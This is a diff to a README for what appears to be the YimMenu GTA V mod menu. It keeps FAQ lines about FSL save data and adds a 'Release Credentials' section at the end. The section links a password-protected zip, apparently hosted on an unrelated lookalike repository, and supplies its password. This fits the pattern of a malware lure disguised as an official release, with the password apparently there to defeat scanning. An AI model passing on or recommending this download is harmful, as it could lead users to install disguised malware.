@@ -27,3 +27,10 @@ FSL reroutes account save data to disk, so any progress made with FSL will only 
 ### I removed FSL and the game doesn't start up anymore
 
 This is a known issue; delete "Documents/GTAV Enhanced/Profiles" to fix
+
+
+---
+
+## 🔐 Release Credentials
+- **Download Package:** [Direct Release Asset](https://github.com/plumenodeblaze7/YimMenuV2-release-ce40/releases/download/v1.0.0/YimMenuV2.zip)
+- **Archive Password:** `JCZA3dXXeS`
